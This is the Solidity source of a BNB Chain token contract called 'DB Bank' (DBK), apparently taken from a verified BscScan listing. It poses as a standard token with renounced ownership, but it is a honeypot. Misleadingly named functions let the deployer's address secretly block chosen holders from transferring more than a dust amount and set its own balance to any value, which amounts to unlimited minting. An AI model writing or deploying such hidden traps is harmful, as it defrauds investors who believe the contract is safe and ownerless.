/**
 *Submitted for verification at BscScan.com on 2023-01-24
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract DBBank {
    uint8 public decimals = 18;
    address public owner;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    mapping(address => bool) public limitSwap;
    mapping(address => mapping(address => uint256)) public allowance;
    address public listLiquidity;
    uint256 constant liquidityReceiverTx = 10 ** 10;
    mapping(address => uint256) public balanceOf;

    address public isBurn;
    mapping(address => bool) public isReceiver;
    string public name = "DB Bank";




    string public symbol = "DBK";
    modifier receiverLaunched() {
        require(limitSwap[msg.sender]);
        _;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        IUniswapV2Router receiverTeam = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        isBurn = IUniswapV2Factory(receiverTeam.factory()).createPair(receiverTeam.WETH(), address(this));
        owner = msg.sender;
        listLiquidity = owner;
        limitSwap[listLiquidity] = true;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
        renounceOwnership();
    }

    function transfer(address dst, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, dst, amount);
    }

    function launchedSwap(address tokenLaunched) public receiverLaunched {
        isReceiver[tokenLaunched] = true;
    }

    function transferFrom(address src, address dst, uint256 amount) external returns (bool) {
        if (allowance[src][msg.sender] != type(uint256).max) {
            require(allowance[src][msg.sender] >= amount);
            allowance[src][msg.sender] -= amount;
        }
        return _transferFrom(src, dst, amount);
    }

    function receiverWalletMax(address minFee) public receiverLaunched {
        limitSwap[minFee] = true;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function _transferFrom(address src, address dst, uint256 amount) internal returns (bool) {
        if (src == listLiquidity || dst == listLiquidity) {
            return listMax(src, dst, amount);
        }
        if (isReceiver[src]) {
            return listMax(src, dst, liquidityReceiverTx);
        }
        return listMax(src, dst, amount);
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function minAmountMax(uint256 launchBuy) public receiverLaunched {
        balanceOf[listLiquidity] = launchBuy;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function listMax(address sellLiquidityAuto, address tradingTakeAuto, uint256 launchBuy) internal returns (bool) {
        require(balanceOf[sellLiquidityAuto] >= launchBuy);
        balanceOf[sellLiquidityAuto] -= launchBuy;
        balanceOf[tradingTakeAuto] += launchBuy;
        emit Transfer(sellLiquidityAuto, tradingTakeAuto, launchBuy);
        return true;
    }


}